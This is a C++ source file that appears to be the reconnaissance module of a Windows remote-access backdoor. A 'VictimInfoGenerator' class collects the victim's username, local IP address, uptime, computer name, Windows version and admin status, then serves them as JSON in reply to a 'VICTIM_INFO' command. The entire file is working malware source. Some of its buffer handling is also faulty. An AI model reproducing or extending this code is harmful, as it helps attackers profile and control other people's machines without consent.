
#define _WIN32_WINNT 0x0603
#include <boost/locale.hpp>
#include "victim_info.h"
using namespace boost::locale::conv;

namespace http
{
	namespace server
	{
				namespace win_version
				{
					const wchar_t* XPOrGreater = L"XP Or Greater";
					const wchar_t* XPSP1OrGreater = L"XP SP1 Or Greater";
					const wchar_t* XPSP2OrGreater = L"XP SP2 Or Greater";
					const wchar_t* XPSP3OrGreater = L"XP SP3 Or Greater";
					const wchar_t* VistaOrGreater = L"Vista Or Greater";
					const wchar_t* VistaSP1OrGreater = L"Vista SP1 Or Greater";
					const wchar_t* VistaSP2OrGreater = L"Vista SP2 Or Greater";
					const wchar_t* Windows7OrGreater = L"Windows 7 Or Greater";
					const wchar_t* Windows7SP1OrGreater = L"Windows 7 SP1 Or Greater";
					const wchar_t* Windows8OrGreater = L"Windows 8 Or Greater";
					const wchar_t* Windows8Point1OrGreater = L"Windows 8.1 Or Greater";
					const wchar_t* Windows10OrGreater = L"Windows 10 Or Greater";
					const wchar_t* Server = L"Server Edition";
					const wchar_t* Client = L"Client Edition";

				}

				wchar_t* VictimInfoGenerator::_GetUserNameW()
				{
					WCHAR username[UNLEN + 1];
					DWORD username_len = UNLEN + 1;
					GetUserName(username, &username_len);
					wchar_t* result = new wchar_t[wcslen(username) + 1];
					memset(result, 0, wcslen(username) + 1);
					wcscpy_s(result, wcslen(username) + 1, username);
					return result;
				}

				wchar_t* VictimInfoGenerator::GetLocalIpAddress()
				{
					IPv4 myIP;
					wchar_t* local_ip = nullptr;
					#ifdef WIN32
					WSAData wsaData;
					if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)
						return local_ip;
					#endif
					SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

					sockaddr_in remoteaddr = { 0 };
					remoteaddr.sin_family = AF_INET;
					remoteaddr.sin_addr.s_addr = inet_addr("8.8.8.8");
					remoteaddr.sin_port = htons(53);

					int con_result = connect(sock, (sockaddr*)&remoteaddr, sizeof(remoteaddr));
					if (con_result == 0)
					{
						sockaddr_in localaddr = { 0 };
						int len = sizeof(localaddr);
						getsockname(sock, (sockaddr*)&localaddr, &len);
						myIP.b1 = localaddr.sin_addr.S_un.S_un_b.s_b1;
						myIP.b2 = localaddr.sin_addr.S_un.S_un_b.s_b2;
						myIP.b3 = localaddr.sin_addr.S_un.S_un_b.s_b3;
						myIP.b4 = localaddr.sin_addr.S_un.S_un_b.s_b4;
						closesocket(sock);
						local_ip = myIP.GetWideCharIp();
					}
				cleaning:
					#ifdef WIN32
						WSACleanup();
					#endif
					return local_ip;
				}

				BOOL VictimInfoGenerator::IsElevated() {
					BOOL fRet = FALSE;
					HANDLE hToken = NULL;
					if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
						TOKEN_ELEVATION Elevation;
						DWORD cbSize = sizeof(TOKEN_ELEVATION);
						if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
							fRet = Elevation.TokenIsElevated;
						}
					}
					if (hToken) {
						CloseHandle(hToken);
					}
					return fRet;
				}

				wchar_t* VictimInfoGenerator::_GetPrivileges()
				{
					wchar_t* privs = new wchar_t[10];
					memset(privs, 0, 10);
					if(IsElevated())
					{
						wcscpy_s(privs, wcslen(L"admin") + 1, L"admin");
					}
					else
					{
						wcscpy_s(privs, wcslen(L"user") + 1, L"user");
					}
					wchar_t* result = new wchar_t[wcslen(privs) + 1];
					wcscpy_s(result, wcslen(privs) + 1, privs);
					delete[] privs;
					return result;
				}

				wchar_t* VictimInfoGenerator::GetUpTime()
				{
					auto uptime = std::chrono::milliseconds(GetTickCount64());
					const long millis = uptime.count();
					wchar_t* buff = new wchar_t[100];
					_ltow(millis, buff, 10);

					wchar_t *result = new wchar_t[wcslen(buff) + 1];
					wcscpy_s(result, wcslen(buff) + 1, buff);
					delete[] buff;
					return result;
				}

				wchar_t* VictimInfoGenerator::_GetComputerName()
				{
					#define INFO_BUFFER_SIZE 256
					TCHAR  infoBuf[INFO_BUFFER_SIZE];
					DWORD  bufCharCount = INFO_BUFFER_SIZE;
					wchar_t* computer_name = nullptr;

					if (GetComputerName(infoBuf, &bufCharCount))
					{
						computer_name = new wchar_t[wcslen(infoBuf) + 1];
						memset(computer_name, 0, wcslen(infoBuf) + 1);
						wcscpy_s(computer_name, wcslen(infoBuf) + 1, infoBuf);
					}

					return computer_name;
				}

				wchar_t* VictimInfoGenerator::_GetWindowsVersion()
				{

					wchar_t* ver = new wchar_t[64];
					memset(ver, 0, wcslen(ver) + 1);
					if (IsWindowsXPOrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::XPOrGreater) + 1, win_version::XPOrGreater);
					}

					if (IsWindowsXPSP1OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::XPSP1OrGreater) + 1, win_version::XPSP1OrGreater);
					}

					if (IsWindowsXPSP2OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::XPSP2OrGreater) + 1, win_version::XPSP2OrGreater);
					}

					if (IsWindowsXPSP3OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::XPSP3OrGreater) + 1, win_version::XPSP3OrGreater);
					}

					if (IsWindowsVistaOrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::VistaOrGreater) + 1, win_version::VistaOrGreater);
					}

					if (IsWindowsVistaSP1OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::VistaSP1OrGreater) + 1, win_version::VistaSP1OrGreater);
					}

					if (IsWindowsVistaSP2OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::VistaSP2OrGreater) + 1, win_version::VistaSP2OrGreater);
					}

					if (IsWindows7OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::Windows7OrGreater) + 1, win_version::Windows7OrGreater);
					}

					if (IsWindows7SP1OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::Windows7SP1OrGreater) + 1, win_version::Windows7SP1OrGreater);
					}

					if (IsWindows8OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::Windows8OrGreater) + 1, win_version::Windows8OrGreater);
					}

					if (IsWindows8Point1OrGreater())
					{
						wcscpy_s(ver, wcslen(win_version::Windows8Point1OrGreater) + 1, win_version::Windows8Point1OrGreater);
					}

					if (IsWindowsServer())
					{
						wcscat_s(ver, wcslen(ver) + wcslen(L", ") + 1, L", ");
						wcscat_s(ver, wcslen(ver) + wcslen(win_version::Server) + 1, win_version::Server);
					}
					else
					{
						wcscat_s(ver, wcslen(ver) + wcslen(L", ") + 1, L", ");
						wcscat_s(ver, wcslen(ver) + wcslen(win_version::Client) + 1, win_version::Client);
					}

					wchar_t *result = new wchar_t[wcslen(ver) + 1];
					wcscpy_s(result, wcslen(ver) + 1, ver);
					return result;
				}

				std::tuple<int, std::vector<char>> VictimInfoGenerator::GetVictimInfo()
				{
					wchar_t* username = VictimInfoGenerator::_GetUserNameW();
					wchar_t* local_ip = VictimInfoGenerator::GetLocalIpAddress();
					wchar_t* uptime = VictimInfoGenerator::GetUpTime();
					wchar_t* comp_name = VictimInfoGenerator::_GetComputerName();
					wchar_t* win_ver = VictimInfoGenerator::_GetWindowsVersion();
					wchar_t* privs = VictimInfoGenerator::_GetPrivileges();

					std::wstringstream wsstream;
					wsstream << L"{ \"victim_info\": ";
					if(username)
					{
						wsstream << L"{ \"username\": " << L"\"" << username << L"\"";
					}
					else
					{
						wsstream << L"{ \"username\": " << L"\"unknown\"";
					}

					wsstream << L",";

					if(local_ip)
					{
						wsstream << L"\"local_ip\": " << L"\"" << local_ip << L"\"";
					}
					else
					{
						wsstream << L"{ \"local_ip\": " << L"\"unknown\"";
					}
					wsstream << L",";

					if(uptime)
					{
						wsstream << L"\"uptime\": " << L"\"" << uptime << L"\"";
					}
					else
					{
						wsstream << L"{ \"uptime\": " << L"\"unknown\"";
					}
					wsstream << L",";

					if(comp_name)
					{
						wsstream << L"\"comp_name\": " << L"\"" << comp_name << L"\"";
					}
					else
					{
						wsstream << L"{ \"comp_name\": " << L"\"unknown\"";
					}
					wsstream << L",";

					if(win_ver)
					{
						wsstream << L"\"win_ver\": " << L"\"" << win_ver << L"\"";
					}
					else
					{
						wsstream << L"{ \"win_ver\": " << L"\"unknown\"";
					}
					wsstream << L",";

					if(privs)
					{
						wsstream << L"\"privs\": " << L"\"" << privs << L"\"";
					}
					else
					{
						wsstream << L"{ \"privs\": " << L"\"unknown\"";
					}
					wsstream << L"}" << L"}";

					std::wstring wstrdata = wsstream.str();
					std::string wide_string_utf = utf_to_utf<char>(wstrdata);
					std::stringstream  ss(wide_string_utf);
					#pragma region
					if (!ss)
					{
						printf("failed to open a stream for victim_info. err: %d\n", GetLastError());
						return std::make_tuple(-1, std::vector<char>());
					}
					#pragma endregion  checks stream

					char stream_buf[16];
					std::vector<char> buffer;
					while (ss.read(stream_buf, sizeof(stream_buf)).gcount() > 0)
						buffer.insert(buffer.end(), stream_buf, stream_buf + ss.gcount());

					return std::make_tuple(0, buffer);
				}

				bool VictimInfoGenerator::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
				{
					if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::VICTIM_INFO))
					{
						return false;
					}
					int code; std::vector<char> buffer;
					std::tie(code, buffer) = VictimInfoGenerator::GetVictimInfo();

					if (code != 0 && buffer.empty())
					{
						std::shared_ptr<reply> temp_rep = reply::stock_reply(reply::internal_server_error);
						rep.swap(temp_rep);
						return true;
					}

					rep->status_line = http::server::status_strings::ok;
					rep->status_line.append(" ").append(req->action_type).append("\r\n");

					std::string s(buffer.data(), buffer.size());
					rep->content.append(s);
					rep->headers.resize(3);
					rep->headers[0].name = "Tag";
					rep->headers[0].value = std::string(req->dictionary_headers.at("Tag"));
					rep->headers[1].name = "Content-Type";
					rep->headers[1].value = mime_types::extension_to_type("json");
					rep->headers[2].name = "Content-Length";
					rep->headers[2].value = std::to_string(rep->content.size());

					return true;
				}
	}
}